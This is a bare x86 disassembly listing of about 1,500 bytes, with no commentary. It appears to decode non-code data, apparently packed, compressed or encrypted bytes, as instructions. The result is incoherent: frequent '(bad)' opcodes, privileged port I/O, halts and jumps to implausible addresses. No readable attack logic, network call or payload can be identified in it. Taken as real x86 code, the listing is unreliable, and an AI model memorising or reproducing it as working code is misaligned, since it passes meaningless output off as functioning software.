  42033c:	fisubr DWORD PTR [edx-0x1f]
  42033f:	jns    0x420375
  420341:	dec    ebx
  420342:	into   
  420343:	(bad)  
  420344:	or     eax,0x107ab5cc
  420349:	pop    eax
  42034a:	(bad)  
  42034b:	cmp    al,BYTE PTR [esi]
  42034d:	xor    ecx,0xda42618c
  420353:	addr16 hlt 
  420355:	test   al,0x0
  420357:	call   0x3f8e1ef8
  42035c:	jb     0x42035a
  42035e:	and    BYTE PTR [edi],al
  420360:	scas   eax,DWORD PTR es:[edi]
  420361:	mov    BYTE PTR [ecx],ah
  420363:	or     eax,0x403ec5e2
  420368:	mov    edi,0x1d3275bb
  42036d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42036e:	stos   BYTE PTR es:[edi],al
  42036f:	mov    eax,ds:0xa335fb59
  420374:	int3   
  420375:	and    al,0xd7
  420377:	lock or edi,edi
  42037a:	sub    ebp,DWORD PTR [edi+0x5f]
  42037d:	lds    esp,FWORD PTR [esi]
  42037f:	and    ah,BYTE PTR [esi]
  420381:	pop    ss
  420382:	mov    ch,0xe7
  420384:	push   cs
  420385:	sub    DWORD PTR [esi+0x599c69f],edx
  42038b:	jae    0x420373
  42038d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42038e:	cmc    
  42038f:	call   0xa2a7a9f9
  420394:	out    dx,al
  420395:	pop    esi
  420396:	push   cs
  420397:	push   eax
  420398:	push   0x569ac3df
  42039d:	ss dec ecx
  42039f:	in     eax,dx
  4203a0:	icebp  
  4203a1:	mov    ah,0xe4
  4203a3:	cmp    al,0x1e
  4203a5:	mov    ebp,0xa7e1f422
  4203aa:	cmp    DWORD PTR [esi+0x6d2353f7],ebx
  4203b0:	and    DWORD PTR [ebx-0x10],edi
  4203b3:	ins    DWORD PTR es:[edi],dx
  4203b4:	loop   0x42034d
  4203b6:	outs   dx,BYTE PTR ds:[esi]
  4203b7:	lods   al,BYTE PTR ds:[esi]
  4203b8:	frstorw [edi-0x7b86b38b]
  4203bf:	test   BYTE PTR [ebx],al
  4203c1:	add    BYTE PTR [ecx+0x278938cd],dh
  4203c7:	fmul   QWORD PTR [eax+0x73]
  4203ca:	pop    ecx
  4203cb:	mov    ebx,0x56d4754b
  4203d0:	icebp  
  4203d1:	into   
  4203d2:	mov    cl,0x8d
  4203d4:	xchg   esp,eax
  4203d5:	add    DWORD PTR [eax+0x64],ebx
  4203d8:	and    edx,ecx
  4203da:	mov    esp,0x6c4b9006
  4203df:	loope  0x420404
  4203e1:	pop    ds
  4203e2:	leave  
  4203e3:	sub    BYTE PTR [edi+eiz*2],ch
  4203e6:	or     BYTE PTR [eax-0x6b],ah
  4203e9:	xchg   esp,eax
  4203ea:	repnz inc ecx
  4203ec:	cmp    al,0xe8
  4203ee:	xchg   esi,eax
  4203ef:	push   es
  4203f0:	test   bl,bh
  4203f2:	or     bh,BYTE PTR [esi+ebp*8-0x6d]
  4203f6:	jne    0x420386
  4203f8:	jmp    0x4b6c3a84
  4203fd:	jmp    0xbb68:0xfdba668f
  420404:	mov    dh,0xe3
  420406:	jp     0x4203ec
  420408:	int3   
  420409:	jns    0x42041b
  42040b:	push   ebx
  42040c:	out    dx,eax
  42040d:	push   cs
  42040e:	jecxz  0x420464
  420410:	or     al,0x9c
  420412:	scas   al,BYTE PTR es:[edi]
  420413:	jmp    0x1c7f2a45
  420418:	sub    DWORD PTR [edi],ecx
  42041a:	xchg   ebx,eax
  42041b:	stos   BYTE PTR es:[edi],al
  42041c:	adc    eax,ebx
  42041e:	adc    esi,0xffffffc4
  420421:	icebp  
  420422:	sbb    eax,0xb59b3aad
  420427:	pop    esp
  420428:	int    0xf3
  42042a:	(bad)  
  42042c:	je     0x4203ed
  42042e:	mov    ch,0xec
  420430:	ss int 0xe9
  420433:	xor    al,0xaf
  420435:	mov    dh,0xa0
  420437:	in     al,dx
  420438:	push   0x1b720e37
  42043d:	(bad)  
  42043e:	xchg   ebx,eax
  42043f:	mov    ebx,0xc12142ed
  420444:	push   ds
  420445:	call   0x425f9fa0
  42044a:	sub    BYTE PTR [esi+0x56],al
  42044d:	test   eax,0x4576462d
  420452:	rcl    BYTE PTR [edx+edx*8-0xb],0xac
  420457:	sbb    al,0xd5
  420459:	mov    DWORD PTR [ecx+0x8758b05],ecx
  42045f:	je     0x42042f
  420461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420462:	dec    esi
  420463:	imul   ebx,DWORD PTR [ebx-0x56],0xf8e262d0
  42046a:	pop    esi
  42046b:	pushf  
  42046c:	fisttp WORD PTR [ebx-0x4d7d6312]
  420472:	test   edi,ebp
  420474:	dec    edi
  420475:	call   0x9e2eeeec
  42047a:	scas   al,BYTE PTR es:[edi]
  42047b:	or     ecx,eax
  42047d:	rcr    DWORD PTR [eax],0x42
  420480:	aaa    
  420481:	retf   0x6268
  420484:	pop    ss
  420485:	sbb    al,BYTE PTR [eax]
  420487:	inc    edi
  420488:	inc    ebp
  420489:	cwde   
  42048a:	or     ecx,DWORD PTR [edx]
  42048c:	imul   eax,DWORD PTR [ebx+0x9],0xffffff8a
  420490:	mov    ah,BYTE PTR [edx]
  420492:	push   ebx
  420493:	jge    0x420420
  420495:	sbb    al,0x26
  420497:	and    DWORD PTR [ebx+edx*2-0x3b],0x53
  42049c:	(bad)  
  42049d:	in     al,dx
  42049e:	xor    DWORD PTR [eax+edx*2+0x76],edx
  4204a2:	cmp    DWORD PTR ds:0x9e3534b1,0x47308c30
  4204ac:	enter  0x1215,0xda
  4204b0:	mov    WORD PTR [ecx+0x10],es
  4204b3:	imul   edx,DWORD PTR [ebx+0x7f6ede9f],0x17d541a7
  4204bd:	retf   
  4204be:	sub    DWORD PTR [edi-0x343ef5ba],ecx
  4204c4:	pusha  
  4204c5:	and    al,0x2c
  4204c7:	xor    cl,al
  4204c9:	ret    0x1768
  4204cc:	je     0x4204df
  4204ce:	cmp    al,0x42
  4204d0:	sbb    eax,0x8fbf749
  4204d5:	(bad)  
  4204d7:	sub    dh,0x32
  4204da:	pop    es
  4204db:	adc    BYTE PTR [eax-0x6a0416b],al
  4204e1:	and    DWORD PTR [edx+0x4f4ec98f],ebp
  4204e7:	mov    dh,0x95
  4204e9:	(bad)  
  4204ea:	retf   
  4204eb:	sbb    edi,DWORD PTR ds:0x9dea6c66
  4204f1:	in     al,0xf9
  4204f3:	push   ecx
  4204f4:	dec    ebp
  4204f5:	inc    ebp
  4204f6:	(bad)  
  4204f8:	adc    ch,BYTE PTR [eax+ebx*2]
  4204fb:	adc    BYTE PTR [ecx],0xaf
  4204fe:	dec    edi
  4204ff:	out    dx,eax
  420500:	xchg   ebx,eax
  420501:	stos   DWORD PTR es:[edi],eax
  420502:	sahf   
  420503:	pop    esp
  420504:	imul   eax,DWORD PTR [edx+0x50af7ad3],0xc4b6f4e9
  42050e:	cmc    
  42050f:	dec    ebp
  420510:	in     al,dx
  420511:	or     ecx,esi
  420513:	lea    esi,[edi]
  420515:	inc    ebx
  420516:	enter  0x6fc6,0x91
  42051a:	dec    eax
  42051b:	js     0x42058c
  42051d:	xlat   BYTE PTR ds:[ebx]
  42051e:	push   esp
  42051f:	push   0x35
  420521:	call   FWORD PTR [edi-0x1c]
  420524:	(bad)  
  420525:	cld    
  420526:	test   eax,0xabb2c5e8
  42052b:	mov    ebp,0x3501f645
  420530:	scas   al,BYTE PTR es:[edi]
  420531:	loopne 0x4204b5
  420533:	les    edx,FWORD PTR [esi+0x12]
  420536:	inc    esp
  420537:	(bad)  
  420538:	xchg   ebx,eax
  420539:	adc    DWORD PTR [edx],eax
  42053b:	aam    0xd6
  42053d:	jl     0x420524
  42053f:	pop    ss
  420540:	push   edx
  420541:	arpl   di,bx
  420543:	xchg   esp,eax
  420544:	inc    esi
  420545:	in     al,dx
  420546:	ret    0x43b3
  420549:	or     edx,0xfffffff3
  42054c:	or     ebp,edx
  42054e:	int3   
  42054f:	fmul   st,st(4)
  420551:	jb     0x4205bf
  420553:	iret   
  420554:	jl     0x4204d8
  420556:	mov    BYTE PTR [ebx+0x687d6ff4],ah
  42055c:	push   ebx
  42055d:	mov    eax,0xd061c2f7
  420562:	cmp    DWORD PTR ds:0x7d8743cd,0xc
  420569:	jg     0x4205e2
  42056b:	mov    bh,0xb2
  42056d:	fistp  WORD PTR [eax+0x2d]
  420570:	(bad)  
  420571:	mov    ch,0x6e
  420573:	mov    edx,0x93ed136
  420578:	repnz aad 0x1e
  42057b:	outs   dx,DWORD PTR ds:[esi]
  42057c:	cwde   
  42057d:	fwait
  42057e:	je     0x420533
  420580:	sbb    al,0x56
  420582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420583:	pushf  
  420584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420585:	ins    BYTE PTR es:[edi],dx
  420586:	push   edi
  420587:	sbb    BYTE PTR [edx],dl
  420589:	pop    edx
  42058a:	sahf   
  42058b:	push   cs
  42058c:	lahf   
  42058d:	push   esp
  42058e:	mov    ebp,ebp
  420590:	add    edx,DWORD PTR [edx-0x7a108374]
  420596:	pop    edx
  420597:	add    ebp,ecx
  420599:	mov    ds:0x8f13b2a,eax
  42059e:	retf   0x548
  4205a1:	jbe    0x4205c3
  4205a3:	(bad)  
  4205a4:	and    BYTE PTR [esi+0x6],bl
  4205a7:	mov    edi,0xa6e4b5c
  4205ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205ad:	cmp    bh,dl
  4205af:	stos   DWORD PTR es:[edi],eax
  4205b0:	loope  0x42055d
  4205b2:	adc    cl,BYTE PTR [esi]
  4205b4:	xchg   esi,eax
  4205b5:	sub    eax,eax
  4205b7:	arpl   WORD PTR [edi+0xdb1529d],cx
  4205bd:	loopne 0x4205c2
  4205bf:	push   ecx
  4205c0:	jl     0x420613
  4205c2:	into   
  4205c3:	adc    al,0x14
  4205c5:	shr    DWORD PTR [esi-0x3c0844d6],1
  4205cb:	ins    DWORD PTR es:[edi],dx
  4205cc:	sub    al,0xb9
  4205ce:	jns    0x4205da
  4205d0:	jns    0x42059d
  4205d2:	popf   
  4205d3:	dec    eax
  4205d4:	rcl    ah,1
  4205d6:	outs   dx,BYTE PTR ds:[esi]
  4205d7:	(bad)  
  4205d8:	sbb    BYTE PTR [edx],al
  4205da:	loope  0x420600
  4205dc:	dec    dx
  4205de:	sbb    ch,dh
  4205e0:	test   al,0x17
  4205e2:	pop    esp
  4205e3:	jmp    0x8d4c5b11
  4205e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205e9:	adc    BYTE PTR gs:[edx],bh
  4205ec:	mov    esp,0xab56f16e
  4205f1:	push   eax
  4205f2:	push   0x73
  4205f4:	fild   DWORD PTR [esi-0x3c]
  4205f7:	pop    edi
  4205f8:	jne    0x420658
  4205fa:	sub    eax,0xee329523
  4205ff:	in     al,0xf9
  420601:	or     eax,0xb64eef9b
  420606:	add    DWORD PTR [ebp-0x2f2f5cc5],0x13
  42060d:	jno    0x4205a6
  42060f:	test   DWORD PTR [eax-0x615aaa58],0x5f0f76ef
  420619:	mov    ds,WORD PTR [edx+0x8]
  42061c:	sub    al,0x54
  42061e:	stos   DWORD PTR es:[edi],eax
  42061f:	ss out 0x95,al
  420622:	xchg   edx,eax
  420623:	inc    ebp
  420624:	iret   
  420625:	dec    esi
  420626:	int3   
  420627:	cwde   
  420628:	bound  edi,QWORD PTR [edi]
  42062a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42062b:	push   ds
  42062c:	sub    DWORD PTR [edx],0x5d93576b
  420632:	std    
  420633:	(bad)  
  420634:	pop    edi
  420635:	daa    
  420636:	pusha  
  420637:	loop   0x4205f7
  420639:	inc    ecx
  42063a:	add    eax,0xaaa46924
  42063f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420640:	cmp    edi,DWORD PTR [edx-0x228883bf]
  420646:	mov    dh,0x98
  420648:	stc    
  420649:	gs or  eax,0xa1f421e6
  42064f:	aam    0xad
  420651:	fdivr  QWORD PTR [ebx+ebx*2-0x16]
  420655:	shl    BYTE PTR ds:0xfc57f074,cl
  42065b:	inc    esi
  42065c:	sbb    ebp,DWORD PTR [eax]
  42065e:	push   0x10
  420660:	add    bh,ch
  420662:	mov    ecx,0x6248253b
  420667:	dec    edx
  420668:	fwait
  420669:	rcr    BYTE PTR [ecx-0x3d2afc65],1
  42066f:	xchg   esp,eax
  420670:	mov    edx,0xa3553d2e
  420675:	shl    BYTE PTR [eax-0x80],1
  420678:	cmp    eax,DWORD PTR [esi]
  42067a:	rcl    DWORD PTR [edi+0xf],cl
  42067d:	pop    ebx
  42067e:	xlat   BYTE PTR ds:[ebx]
  42067f:	in     eax,dx
  420680:	sbb    bl,BYTE PTR ds:0x30bc06a2
  420686:	pop    ecx
  420687:	cmp    eax,0x67d06d
  42068c:	cdq    
  42068d:	pop    ecx
  42068e:	mov    eax,0xe14213a6
  420693:	jb     0x420663
  420695:	ret    
  420696:	int    0xd2
  420698:	push   ss
  420699:	dec    esp
  42069a:	(bad)  
  42069b:	clc    
  42069c:	cmp    DWORD PTR [esi+0x9590bbb],eax
  4206a2:	sar    ebx,0x1e
  4206a5:	out    dx,al
  4206a6:	xor    al,0x56
  4206a8:	jmp    0x9c4f:0x147af399
  4206af:	daa    
  4206b0:	inc    ebp
  4206b1:	push   ebp
  4206b2:	ret    0x8cf4
  4206b5:	out    dx,eax
  4206b6:	inc    esi
  4206b7:	and    al,0x63
  4206b9:	adc    ebp,DWORD PTR [ebx+0x76]
  4206bc:	dec    ecx
  4206bd:	in     eax,0x16
  4206bf:	int3   
  4206c0:	push   es
  4206c1:	sar    BYTE PTR [edx-0x76],cl
  4206c4:	cmp    ah,BYTE PTR [edx]
  4206c6:	cli    
  4206c7:	adc    bl,cl
  4206c9:	pop    ds
  4206ca:	retf   
  4206cb:	out    dx,al
  4206cc:	pop    esi
  4206cd:	mov    eax,0x56032f24
  4206d2:	into   
  4206d3:	(bad)  
  4206d4:	sbb    ebx,DWORD PTR [edi-0x2365f682]
  4206da:	push   esi
  4206db:	jg     0x420684
  4206dd:	adc    edi,DWORD PTR [eax+0x14a66b52]
  4206e3:	lahf   
  4206e4:	dec    edx
  4206e5:	aad    0x22
  4206e7:	xor    esi,DWORD PTR [ecx+0x68]
  4206ea:	daa    
  4206eb:	cs jmp 0xa7762163
  4206f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206f2:	mov    ds:0xacc10b1e,al
  4206f7:	cwde   
  4206f8:	cmp    bh,BYTE PTR [edx]
  4206fa:	xor    eax,0xc76747d6
  4206ff:	jae    0x420726
  420701:	mov    dh,BYTE PTR [ebx-0x63]
  420704:	add    ch,BYTE PTR [esi-0x65d5cc25]
  42070a:	or     DWORD PTR [edx-0x19d4e1bb],edx
  420710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420711:	(bad)  
  420712:	repnz xchg esp,eax
  420714:	sahf   
  420715:	mov    ebp,0x36aa9954
  42071a:	mov    edi,0x18ab9cf3
  42071f:	and    BYTE PTR [esi+0x79f8537e],bl
  420725:	mov    bl,0x46
  420727:	in     eax,0x30
  420729:	mov    ebp,0x915ea863
  42072e:	test   al,0xd6
  420730:	paddusb mm5,QWORD PTR [edi+0x47f44202]
  420737:	in     al,0x97
  420739:	shr    DWORD PTR [ebp+0x30],cl
  42073c:	mov    al,ds:0x19327d74
  420741:	push   esp
  420742:	pop    edx
  420743:	std    
  420744:	ja     0x42079b
  420746:	jne    0x42073e
  420748:	addr16 push 0x36086b89
  42074e:	stc    
  42074f:	inc    ecx
  420750:	push   ebx
  420751:	push   ebx
  420752:	dec    esp
  420753:	push   edi
  420754:	and    DWORD PTR [edi+0x736f8c3b],0x4b6e9567
  42075e:	cmp    DWORD PTR [ecx],edi
  420760:	pop    eax
  420761:	div    al
  420763:	data16 shl dl,0x93
  420767:	cvtps2pd xmm2,xmm0
  42076a:	inc    eax
  42076b:	and    esi,DWORD PTR [ebp+0xa553094]
  420771:	aam    0x49
  420773:	mov    esi,0x6a2edc36
  420778:	(bad)  
  420779:	cmp    ch,dh
  42077b:	fisttp WORD PTR [ecx+0x6f]
  42077e:	call   0xb633:0xfebc9f5f
  420785:	test   DWORD PTR [esi-0x31],eax
  420788:	add    al,BYTE PTR [eax+edx*4+0x57]
  42078c:	jb     0x420722
  42078e:	imul   edx,edx,0xffffffdb
  420791:	jecxz  0x4207c3
  420793:	leave  
  420794:	push   esp
  420795:	mov    eax,0x19eda9d3
  42079a:	mov    edx,0x78aa39a
  42079f:	in     eax,dx
  4207a0:	sbb    DWORD PTR [eax+0x14],0x7d06adb8
  4207a7:	mov    ds:0x8f8b5147,eax
  4207ac:	outs   dx,BYTE PTR ds:[esi]
  4207ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207ae:	mov    ds:0xcba336f4,eax
  4207b3:	mov    al,ds:0xafd842d9
  4207b8:	jnp    0x420772
  4207ba:	pusha  
  4207bb:	add    ebx,ecx
  4207bd:	dec    esi
  4207be:	or     BYTE PTR [ecx-0x2fc24ad],bh
  4207c4:	mov    ebp,0xc553917a
  4207c9:	sar    DWORD PTR [edx-0x36],0x4e
  4207cd:	mov    al,0x26
  4207cf:	mov    esi,0x1929e64b
  4207d4:	push   edi
  4207d5:	fwait
  4207d6:	shr    BYTE PTR ds:0x6bcf0a4c,cl
  4207dc:	(bad)  [esp+esi*1+0x68]
  4207e0:	mov    edx,0x2aee7bfc
  4207e5:	out    0x22,eax
  4207e7:	sub    eax,0xe6551836
  4207ec:	cmp    ebp,DWORD PTR [ebx]
  4207ee:	lea    ebp,[eax+0x328227c8]
  4207f4:	int3   
  4207f5:	imul   ebp,DWORD PTR [ebx-0x5],0x6feaa885
  4207fc:	xchg   ebx,eax
  4207fd:	into   
  4207fe:	mov    bh,0xa2
  420800:	stos   BYTE PTR es:[edi],al
  420801:	aad    0xd4
  420803:	mov    ebp,0x2258e4b5
  420808:	add    BYTE PTR [ebx],bh
  42080a:	push   ebx
  42080b:	nop
  42080c:	adc    eax,0xbf31534d
  420811:	inc    edi
  420812:	mov    eax,ds:0x1c98010a
  420817:	xchg   edx,eax
  420818:	(bad)  
  420819:	mov    BYTE PTR [edx+0x78a0a206],bh
  42081f:	dec    esp
  420820:	jne    0x4208a1
  420822:	sar    BYTE PTR [edx+0xfc03e79],0xe2
  420829:	push   0x7135d705
  42082e:	into   
  42082f:	xor    al,0x3c
  420831:	js     0x4207e4
  420833:	jle    0x42089f
  420835:	lock in al,0x2e
  420838:	mov    eax,0xdceca90e
  42083d:	jno    0x420830
  42083f:	sub    BYTE PTR [edx+0x2ff0e258],al
  420845:	add    DWORD PTR [edx],0x866c1d8b
  42084b:	jg     0x4207f3
  42084d:	inc    ebx
  42084e:	lock mov dh,0x1
  420851:	std    
  420852:	sti    
  420853:	inc    esi
  420854:	add    BYTE PTR [eax+0x6],bh
  420857:	inc    eax
  420858:	mov    ah,0xac
  42085a:	arpl   WORD PTR [edi+0x78],di
  42085d:	mov    eax,0x25682b9d
  420862:	jno    0x4208c5
  420864:	push   eax
  420865:	push   ebx
  420866:	pop    ebp
  420867:	xlat   BYTE PTR ds:[ebx]
  420868:	aas    
  420869:	iret   
  42086a:	lods   eax,DWORD PTR ds:[esi]
  42086b:	jbe    0x4208d6
  42086d:	not    DWORD PTR [ecx]
  42086f:	xlat   BYTE PTR ds:[ebx]
  420870:	mov    eax,ds:0x6be9a1c6
  420875:	push   edi
  420876:	jl     0x42082b
  420878:	aas    
  420879:	not    edx
  42087b:	fdiv   st,st(1)
  42087d:	mov    ecx,0xea30c325
  420882:	cmp    al,0x5
  420884:	shr    BYTE PTR [edx],cl
  420886:	shl    bh,cl
  420888:	adc    edi,DWORD PTR [ebx-0x609bfd44]
  42088e:	loopne 0x4208fd
  420890:	pop    ecx
  420891:	inc    esp
  420892:	cmp    eax,0x7e5e16ea
  420897:	and    eax,0x573d4f3b
  42089c:	mov    ebp,0xd02014cf
  4208a1:	call   0x7116:0x46a3dda6
  4208a8:	cwde   
  4208a9:	(bad)  
  4208aa:	fcom   DWORD PTR [edx-0x2a]
  4208ad:	mov    edx,0x68a3ee9d
  4208b2:	inc    esi
  4208b3:	retf   
  4208b4:	mov    esp,0x3dbe049b
  4208b9:	mov    dh,0xfb
  4208bb:	popf   
  4208bc:	loope  0x420849
  4208be:	xor    eax,0xd5933e35
  4208c3:	clc    
  4208c4:	jno    0x4208a9
  4208c6:	xchg   edi,eax
  4208c7:	or     DWORD PTR cs:[esi],ecx
  4208ca:	inc    eax
  4208cb:	sbb    dl,BYTE PTR [ebp+0x1]
  4208ce:	pop    edx
  4208cf:	jecxz  0x4208a8
  4208d1:	repz aaa 
  4208d3:	cmc    
  4208d4:	repnz cs mov ebp,0xd5092620
  4208db:	and    eax,0x7fb2722b
  4208e0:	pop    es
  4208e1:	sar    BYTE PTR [ecx],0x20
  4208e4:	ror    esp,cl
  4208e6:	pop    ds
  4208e7:	sub    edi,edi
  4208e9:	pop    eax
  4208ea:	mov    edx,0xe891026a
  4208ef:	and    al,0x83
  4208f1:	pop    ebp
  4208f2:	sar    ebp,0xf4
  4208f5:	test   eax,0x20339f3
  4208fa:	pusha  
  4208fb:	shl    DWORD PTR [esi+0x5f3d319b],cl
  420901:	mov    DWORD PTR [edi],edi
  420903:	pop    ebx
  420904:	mov    bh,0x71
  420906:	gs (bad) 
  420908:	sar    BYTE PTR [ecx-0x68ac2668],0x96
  42090f:	jmp    0x42095e
  420911:	mov    eax,ds:0x4ec992d0
  420916:	and    DWORD PTR [ebx-0x7e],ebx
  420919:	enter  0xff59,0x86
  42091d:	or     DWORD PTR [ecx+0x16],eax
  420920:	mov    bl,0xb8
  420922:	adc    DWORD PTR [ecx+0x21ee3b92],esi
  420928:	jnp    0x420968
  42092a:	pushf  
  42092b:	pop    ss
  42092c:	clc    
  42092d:	loope  0x42092f
  42092f:	shl    BYTE PTR [esi+0x52],1
  420932:	pusha  
  420933:	hlt    
  420934:	sbb    al,0x55
  420936:	sub    al,BYTE PTR [ecx+edi*2-0x69]
  42093a:	imul   ebp,DWORD PTR [ebx+eiz*4+0x14],0x89edd5b5
  420942:	mov    ecx,0x17f85af7
  420947:	ret    
  420948:	mov    edi,0x68f09fb5
  42094d:	mov    eax,0x4d96db67
  420952:	adc    DWORD PTR [edx-0x7c],esi
  420955:	sub    eax,0x2f3a1948
  42095a:	(bad)  
  42095b:	inc    DWORD PTR [ebx-0x32]
  42095e:	mov    ah,0x18
  420960:	push   edx
  420961:	mov    edi,0xb53d9245
  420966:	call   0x2589:0x38950a20
  42096d:	xchg   edx,eax
  42096e:	cld    
  42096f:	fiadd  WORD PTR [ecx-0x18927345]
  420975:	sub    DWORD PTR [eax],edx
  420977:	push   edx
  420978:	inc    ebp
  420979:	add    BYTE PTR [ebx],0x6e
  42097c:	nop
  42097d:	mov    eax,0xb47860fe
  420982:	xchg   DWORD PTR [edx+ebx*1+0x5],ebp
  420986:	aas    
  420987:	(bad)  
  420988:	rol    DWORD PTR [edi+0x20bd51],cl
  42098e:	das    
  42098f:	test   eax,0x276c44a4
  420994:	jo     0x420962
  420996:	inc    DWORD PTR [ebx-0x79]
  420999:	adc    edx,ebp
  42099b:	sbb    DWORD PTR [ebp+0x700b680],ebp
  4209a1:	mov    dh,0xc2
  4209a3:	xchg   ecx,eax
  4209a4:	into   
  4209a5:	daa    
  4209a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209a7:	push   ecx
  4209a8:	pusha  
  4209a9:	adc    ebx,DWORD PTR [ebp+0x5d]
  4209ac:	js     0x4209cb
  4209ae:	out    dx,al
  4209af:	ss pop esi
  4209b1:	je     0x420970
  4209b3:	sbb    BYTE PTR [eax+0x64],al
  4209b6:	icebp  
  4209b7:	jge    0x420a2a
  4209b9:	aaa    
  4209ba:	stc    
  4209bb:	sub    BYTE PTR [edi],cl
  4209bd:	ror    DWORD PTR [ecx],1
  4209bf:	inc    eax
  4209c0:	pushf  
  4209c1:	fld    QWORD PTR [edi]
  4209c3:	pop    ebx
  4209c4:	mov    bh,0xea
  4209c6:	cwde   
  4209c7:	loop   0x420a20
  4209c9:	xlat   BYTE PTR ds:[ebx]
  4209ca:	or     al,BYTE PTR [edx]
  4209cc:	dec    ecx
  4209cd:	das    
  4209ce:	xchg   ecx,eax
  4209cf:	out    0xf9,al
  4209d1:	aaa    
  4209d2:	das    
  4209d3:	mov    esi,0xeb8ded19
  4209d8:	rcl    BYTE PTR [ebx+0x12b5922a],0x15
  4209df:	(bad)  
  4209e1:	pusha  
  4209e2:	aaa    
  4209e3:	lods   al,BYTE PTR ds:[esi]
  4209e4:	mov    al,ds:0x8e05a205
  4209e9:	dec    ebp
  4209ea:	inc    edi
  4209eb:	bound  edi,QWORD PTR [edi+0x6b5d385d]
  4209f1:	sbb    DWORD PTR [edx+esi*8+0x70e2ea83],edi
  4209f8:	retf   
  4209f9:	dec    ecx
  4209fa:	xor    al,0x86
  4209fc:	out    dx,eax
  4209fd:	mov    esi,0x3127850b
  420a02:	dec    eax
  420a03:	stos   DWORD PTR es:[edi],eax
  420a04:	test   eax,0xbdfe1ac1
  420a09:	lea    eax,[eax-0x263ea2f]
  420a0f:	push   ebp
  420a10:	dec    edx
  420a11:	push   eax
  420a12:	int    0x2c
  420a14:	enter  0xffd5,0x78
  420a18:	retf   
  420a19:	add    DWORD PTR [edi],ebp
  420a1b:	or     esi,DWORD PTR [eax+0x35c0b45d]
  420a21:	sbb    al,0xe9
  420a23:	scas   al,BYTE PTR es:[edi]
  420a24:	fs je  0x420a5c
  420a27:	retf   0x9952
  420a2a:	xchg   edi,eax
  420a2b:	aad    0xfd
  420a2d:	add    al,dl
  420a2f:	(bad)  
  420a30:	es mov cl,bh
  420a33:	mov    bl,0x44
  420a35:	cdq    
  420a36:	or     ecx,edx
  420a38:	clc    
  420a39:	popa   
  420a3a:	ds loopne 0x4209f1
  420a3d:	ror    ah,1
  420a3f:	add    ch,BYTE PTR [eax]
  420a41:	mov    edx,DWORD PTR ds:0xed70e3db
  420a47:	out    dx,al
  420a48:	cli    
  420a49:	fiadd  DWORD PTR [esi]
  420a4b:	push   cs
  420a4c:	jp     0x4209d0
  420a4e:	push   ebx
  420a4f:	adc    ch,BYTE PTR [esi+0xd]
  420a52:	dec    esp
  420a53:	inc    ebp
  420a54:	fisub  WORD PTR [ecx+0xbe61ea0]
  420a5a:	mov    ds:0x73b279da,eax
  420a5f:	lods   eax,DWORD PTR ds:[esi]
  420a60:	mov    ds:0xb3b0e8ef,eax
  420a65:	dec    ecx
  420a66:	popa   
  420a67:	adc    ecx,DWORD PTR [edi-0xa]
  420a6a:	lds    esp,FWORD PTR [ebx-0x43d54e0f]
  420a70:	mov    ebx,0xa96cfef6
  420a75:	pushf  
  420a76:	int    0x13
  420a78:	cli    
  420a79:	retf   
  420a7a:	shl    BYTE PTR [edx-0x1c],cl
  420a7d:	ror    BYTE PTR [ebp+eax*2+0x406dff20],0xc6
  420a85:	out    dx,al
  420a86:	sti    
  420a87:	xchg   esi,eax
  420a88:	pop    edi
  420a89:	inc    esp
  420a8a:	inc    ebx
  420a8b:	mov    WORD PTR [ecx-0x1e],cs
  420a8e:	dec    esi
  420a8f:	or     BYTE PTR ss:[ebp-0x2],bh
  420a93:	pop    ss
  420a94:	imul   ecx,DWORD PTR [edi-0x523c9bbd],0x57720e5e
  420a9e:	mov    bl,0xa
  420aa0:	out    dx,eax
  420aa1:	inc    esi
  420aa2:	fs sahf 
  420aa4:	addr16 hlt 
  420aa6:	mov    eax,0x6fd72194
  420aab:	adc    BYTE PTR [edx],dl
  420aad:	outs   dx,BYTE PTR ds:[esi]
  420aae:	mov    dl,0x32
  420ab0:	pop    ebx
  420ab1:	fdiv   QWORD PTR [eax]
  420ab3:	pextrw ebx,(bad),0xc5
  420ab5:	cdq    
  420ab6:	cmp    BYTE PTR [ebx+esi*2+0x6a6ada71],ah
  420abd:	(bad)  
  420abe:	sub    al,0x9b
  420ac0:	(bad)  
  420ac1:	jmp    0x2feb:0x6e8e80bf
  420ac8:	int3   
  420ac9:	jmp    0x9d0a:0x8bc64afa
  420ad0:	cmp    al,0x60
  420ad2:	repz imul ebx,DWORD PTR [edx-0x5c],0x32b6f179
  420ada:	dec    ebx
  420adb:	retf   
  420adc:	xlat   BYTE PTR ds:[ebx]
  420add:	jns    0x420b09
  420adf:	imul   edi,DWORD PTR [eax],0x44
  420ae2:	loopne 0x420af8
  420ae4:	push   es
  420ae5:	jnp    0x420aa7
  420ae7:	(bad)  
  420aea:	jno    0x420b15
  420aec:	icebp  
  420aed:	idiv   dh
  420aef:	arpl   WORD PTR ds:0x47cfe028,cx
  420af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420af6:	pop    es
  420af7:	inc    esi
  420af8:	xor    al,0xe
  420afa:	push   edi
  420afb:	xor    eax,0xc817f379
  420b00:	(bad)  
  420b02:	push   0xfffffffe
  420b04:	pushf  
  420b05:	xor    DWORD PTR [esp+eiz*2],ecx
  420b08:	in     eax,dx
  420b09:	sub    DWORD PTR [edx+edx*1-0x2c],edx
  420b0d:	lahf   
  420b0e:	(bad)  
  420b0f:	jmp    0x420ad6
  420b11:	imul   ecx,esi,0xe34d21ca
  420b17:	pop    esp
  420b18:	push   ebp
  420b19:	(bad)  
  420b1a:	sbb    bl,BYTE PTR [edi]
  420b1c:	xchg   ebx,eax
  420b1d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  420b1f:	loopne 0x420aa9
  420b21:	cs jb  0x420b0f
  420b24:	add    BYTE PTR [ecx+0x2ede609d],ah
